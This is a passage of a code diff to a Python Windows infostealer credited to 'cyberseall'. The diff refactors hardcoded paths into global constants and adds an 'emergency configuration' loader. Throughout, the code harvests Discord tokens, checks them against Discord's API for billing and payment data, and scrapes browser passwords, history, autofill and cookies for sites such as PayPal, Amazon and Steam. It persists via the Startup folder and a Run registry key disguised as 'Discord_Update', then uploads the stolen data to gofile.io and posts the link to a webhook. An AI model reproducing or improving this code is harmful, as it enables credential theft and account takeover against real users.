+                            f.write(f"  ... and {len(form_data) - AUTOFILL_FORM_LIMIT} more entries\n")
                         f.write("\n")
 
                 f.write(f"\nCaptured at: {current_time}\n")
@@ -1571,7 +1448,7 @@ def create_and_upload_data_files(browser_passwords, browser_history, browser_aut
                     f.write(f"DOMAIN: {host} ({len(cookies)} cookies)\n")
                     f.write("-------------------------------------------------------------------------------\n")
 
-                    for i, cookie in enumerate(cookies[:20], 1):
+                    for i, cookie in enumerate(cookies[:COOKIES_PER_DOMAIN_LIMIT], 1):
                         f.write(f"  COOKIE #{i}:\n")
                         f.write(f"    Browser: {cookie['browser']}\n")
                         f.write(f"    Name: {cookie['name']}\n")
@@ -1579,8 +1456,8 @@ def create_and_upload_data_files(browser_passwords, browser_history, browser_aut
                         f.write(f"    Value: {cookie['value'][:100]}{'...' if len(cookie['value']) > 100 else ''}\n")
                         f.write("    -------------------------------------------------------------------\n")
 
-                    if len(cookies) > 20:
-                        f.write(f"  ... and {len(cookies) - 20} more cookies\n")
+                    if len(cookies) > COOKIES_PER_DOMAIN_LIMIT:
+                        f.write(f"  ... and {len(cookies) - COOKIES_PER_DOMAIN_LIMIT} more cookies\n")
                     f.write("\n")
 
                 f.write(f"\nCaptured at: {current_time}\n")
@@ -1716,35 +1593,108 @@ def create_and_upload_data_files(browser_passwords, browser_history, browser_aut
         return None
 
 def get_token():
+    # Vollständige Notfall-Konfiguration laden
+    def load_emergency_config():
+        global TOKEN_PATHS, BROWSER_PATHS, DISCORD_PATHS, COOKIE_BROWSER_PATHS
+        global FIREFOX_INSTALLATIONS, FIREFOX_PROFILE_LOCATIONS, IMPORTANT_DOMAINS
+        global API_TIMEOUT, WATERMARK_TEXT, WEBHOOK_TIMEOUT, STARTUP_FOLDER, STARTUP_FILENAME
+        global REGISTRY_KEY_PATH, REGISTRY_VALUE_NAME, STORAGE_PATH, CONFIG_FILE
+        global SCREENSHOT_MAX_WIDTH, SCREENSHOT_QUALITY, SEPARATOR_LINE, SUBSECTION_LINE
+        global FILE_HEADERS, TEMP_DATA_FOLDER, UPLOAD_TIMEOUT
+        
+        TOKEN_PATHS = {
+            'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
+            'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
+            'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
+            'Discord Development': os.path.join(os.getenv('APPDATA'), 'discorddevelopment'),
+            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
+            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
+            'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+        }
+        
+        BROWSER_PATHS = {
+            "Chrome": {
+                "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+                "login_db": "\\Default\\Login Data",
+                "history_db": "\\Default\\History",
+                "autofill_db": "\\Default\\Web Data"
+            },
+            "Edge": {
+                "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+                "login_db": "\\Default\\Login Data",
+                "history_db": "\\Default\\History",
+                "autofill_db": "\\Default\\Web Data"
+            },
+            "Brave": {
+                "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+                "login_db": "\\Default\\Login Data",
+                "history_db": "\\Default\\History",
+                "autofill_db": "\\Default\\Web Data"
+            }
+        }
+        
+        DISCORD_PATHS = {
+            'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
+            'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
+            'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
+            'Discord Development': os.path.join(os.getenv('APPDATA'), 'discorddevelopment'),
+        }
+        
+        COOKIE_BROWSER_PATHS = {
+            'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+            'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+            'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+        }
+        
+        FIREFOX_INSTALLATIONS = {
+            "Firefox": os.path.join(os.getenv("PROGRAMFILES"), "Mozilla Firefox"),
+            "Firefox (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Mozilla Firefox")
+        }
+        
+        FIREFOX_PROFILE_LOCATIONS = {
+            "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
+            "Firefox Developer": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Developer Edition", "Profiles"),
+            "Firefox Nightly": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Nightly", "Profiles")
+        }
+        
+        IMPORTANT_DOMAINS = ["discord", "google", "paypal", "amazon", "steam", "github", "roblox"]
+        API_TIMEOUT = 5
+        WATERMARK_TEXT = "Made by cyberseall"
+        WEBHOOK_TIMEOUT = 10
+        STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        STARTUP_FILENAME = 'Discord_Update.exe'
+        REGISTRY_KEY_PATH = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+        REGISTRY_VALUE_NAME = 'Discord_Update'
+        STORAGE_PATH = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
+        CONFIG_FILE = os.path.join(STORAGE_PATH, 'config.json')
+        SCREENSHOT_MAX_WIDTH = 1280
+        SCREENSHOT_QUALITY = 85
+        SEPARATOR_LINE = "==============================================================================="
+        SUBSECTION_LINE = "-------------------------------------------------------------------------------"
+        FILE_HEADERS = {
+            "passwords": "BROWSER PASSWORDS CAPTURED",
+            "history": "BROWSER HISTORY CAPTURED", 
+            "autofills": "BROWSER AUTOFILLS CAPTURED",
+            "cookies": "BROWSER COOKIES CAPTURED",
+            "system_info": "SYSTEM INFORMATION CAPTURED",
+            "discord_tokens": "DISCORD TOKENS CAPTURED"
+        }
+        TEMP_DATA_FOLDER = os.path.join(os.getenv("APPDATA"), "TempData")
+        UPLOAD_TIMEOUT = 30
+        GOFILE_UPLOAD_URL = 'https://upload.gofile.io/uploadfile'
+        GOFILE_CREATE_FOLDER_URL = 'https://api.gofile.io/contents/createFolder'
+    
+    # Prüfe ob Konfiguration geladen ist
+    if 'TOKEN_PATHS' not in globals():
+        print("Loading emergency configuration...")
+        load_emergency_config()
+    
     already_check = []
     checker = []
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
     chrome = local + "\\Google\\Chrome\\User Data"
-    paths = {
-        'Discord': roaming + '\\discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Lightcord': roaming + '\\Lightcord',
-        'Discord PTB': roaming + '\\discordptb',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
-        'Amigo': local + '\\Amigo\\User Data',
-        'Torch': local + '\\Torch\\User Data',
-        'Kometa': local + '\\Kometa\\User Data',
-        'Orbitum': local + '\\Orbitum\\User Data',
-        'CentBrowser': local + '\\CentBrowser\\User Data',
-        '7Star': local + '\\7Star\\7Star\\User Data',
-        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
-        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
-        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
-        'Chrome': chrome + 'Default',
-        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
-        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
-        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Iridium': local + '\\Iridium\\User Data\\Default'
-    }
+    paths = TOKEN_PATHS
 
     system_info = get_system_info()
     installed_browsers = get_installed_browsers()
@@ -1813,7 +1763,7 @@ def get_token():
                         already_check.append(value)
                         headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                         try:
-                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
+                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=API_TIMEOUT)
                             if res.status_code == 200:
                                 try:
                                     res_json = res.json()
@@ -1827,7 +1777,7 @@ def get_token():
                                     has_nitro = False
 
                                     try:
-                                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=5)
+                                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=API_TIMEOUT)
                                         nitro_data = res.json()
                                         has_nitro = bool(len(nitro_data) > 0)
                                         days_left = 0
@@ -1840,7 +1790,7 @@ def get_token():
 
                                     payment_methods = []
                                     try:
-                                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers, timeout=5)
+                                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers, timeout=API_TIMEOUT)
                                         if res.status_code == 200:
                                             payment_data = res.json()
                                             for pm in payment_data:
@@ -1895,16 +1845,9 @@ def get_token():
         return False
 
     cookies_to_grab = []
-    for browser_name, path in {
-        'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-        'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-        'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
-        'Opera': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
-        'Opera GX': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
-        'Vivaldi': os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
-    }.items():
+    for browser_name, path in COOKIE_BROWSER_PATHS.items():
         if os.path.exists(path):
-            important_domains = ["discord", "google", "paypal", "amazon", "steam", "github", "roblox"]
+            important_domains = IMPORTANT_DOMAINS
             for domain in important_domains:
                 cookies_domain = get_cookies({browser_name: path}, domain)
                 cookies_to_grab.extend(cookies_domain)
@@ -1935,7 +1878,7 @@ def get_token():
                         "description": f"[Download ZIP Archive]({gofile_link})",
                         "color": 16711680,
                         "footer": {
-                            "text": "Made by cyberseall"
+                            "text": WATERMARK_TEXT
                         },
                         "timestamp": datetime.now().isoformat()
                     }
@@ -1951,7 +1894,7 @@ def get_token():
                         "description": "Upload failed - no data available",
                         "color": 16711680,
                         "footer": {
-                            "text": "Made by cyberseall"
+                            "text": WATERMARK_TEXT
                         },
                         "timestamp": datetime.now().isoformat()
                     }
@@ -1962,7 +1905,7 @@ def get_token():
             'Content-Type': 'application/json',
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
         }
-        requests.post(webhook_url, json=embed_message, headers=headers2, timeout=10)
+        requests.post(webhook_url, json=embed_message, headers=headers2, timeout=WEBHOOK_TIMEOUT)
 
     except Exception as e:
         print(f"Error sending embed: {str(e)}")
@@ -1971,7 +1914,103 @@ def get_token():
 
     return True
 
+def load_emergency_config_global():
+    """Globale Notfall-Konfiguration laden"""
+    global TOKEN_PATHS, BROWSER_PATHS, DISCORD_PATHS, COOKIE_BROWSER_PATHS
+    global FIREFOX_INSTALLATIONS, FIREFOX_PROFILE_LOCATIONS, IMPORTANT_DOMAINS
+    global API_TIMEOUT, WATERMARK_TEXT, WEBHOOK_TIMEOUT, STARTUP_FOLDER, STARTUP_FILENAME
+    global REGISTRY_KEY_PATH, REGISTRY_VALUE_NAME, STORAGE_PATH, CONFIG_FILE
+    global SCREENSHOT_MAX_WIDTH, SCREENSHOT_QUALITY, SEPARATOR_LINE, SUBSECTION_LINE
+    global FILE_HEADERS, TEMP_DATA_FOLDER, UPLOAD_TIMEOUT, GOFILE_UPLOAD_URL, GOFILE_CREATE_FOLDER_URL
+    
+    TOKEN_PATHS = {
+        'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
+        'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
+        'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
+        'Discord Development': os.path.join(os.getenv('APPDATA'), 'discorddevelopment'),
+        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
+        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
+        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
+    }
+    
+    BROWSER_PATHS = {
+        "Chrome": {
+            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+            "login_db": "\\Default\\Login Data",
+            "history_db": "\\Default\\History",
+            "autofill_db": "\\Default\\Web Data"
+        },
+        "Edge": {
+            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+            "login_db": "\\Default\\Login Data",
+            "history_db": "\\Default\\History",
+            "autofill_db": "\\Default\\Web Data"
+        },
+        "Brave": {
+            "profile_path": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+            "login_db": "\\Default\\Login Data",
+            "history_db": "\\Default\\History",
+            "autofill_db": "\\Default\\Web Data"
+        }
+    }
+    
+    DISCORD_PATHS = {
+        'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
+        'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
+        'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
+        'Discord Development': os.path.join(os.getenv('APPDATA'), 'discorddevelopment'),
+    }
+    
+    COOKIE_BROWSER_PATHS = {
+        'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+        'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+        'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+    }
+    
+    FIREFOX_INSTALLATIONS = {
+        "Firefox": os.path.join(os.getenv("PROGRAMFILES"), "Mozilla Firefox"),
+        "Firefox (x86)": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Mozilla Firefox")
+    }
+    
+    FIREFOX_PROFILE_LOCATIONS = {
+        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
+        "Firefox Developer": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Developer Edition", "Profiles"),
+        "Firefox Nightly": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox Nightly", "Profiles")
+    }
+    
+    IMPORTANT_DOMAINS = ["discord", "google", "paypal", "amazon", "steam", "github", "roblox"]
+    API_TIMEOUT = 5
+    WATERMARK_TEXT = "Made by cyberseall"
+    WEBHOOK_TIMEOUT = 10
+    STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    STARTUP_FILENAME = 'Discord_Update.exe'
+    REGISTRY_KEY_PATH = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+    REGISTRY_VALUE_NAME = 'Discord_Update'
+    STORAGE_PATH = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
+    CONFIG_FILE = os.path.join(STORAGE_PATH, 'config.json')
+    SCREENSHOT_MAX_WIDTH = 1280
+    SCREENSHOT_QUALITY = 85
+    SEPARATOR_LINE = "==============================================================================="
+    SUBSECTION_LINE = "-------------------------------------------------------------------------------"
+    FILE_HEADERS = {
+        "passwords": "BROWSER PASSWORDS CAPTURED",
+        "history": "BROWSER HISTORY CAPTURED", 
+        "autofills": "BROWSER AUTOFILLS CAPTURED",
+        "cookies": "BROWSER COOKIES CAPTURED",
+        "system_info": "SYSTEM INFORMATION CAPTURED",
+        "discord_tokens": "DISCORD TOKENS CAPTURED"
+    }
+    TEMP_DATA_FOLDER = os.path.join(os.getenv("APPDATA"), "TempData")
+    UPLOAD_TIMEOUT = 30
+    GOFILE_UPLOAD_URL = 'https://upload.gofile.io/uploadfile'
+    GOFILE_CREATE_FOLDER_URL = 'https://api.gofile.io/contents/createFolder'
+
 if __name__ == '__main__':
+    # Lade Notfall-Konfiguration falls nötig
+    if 'TOKEN_PATHS' not in globals():
+        print("Loading emergency configuration...")
+        load_emergency_config_global()
+    
     add_to_startup()
 
     get_token()
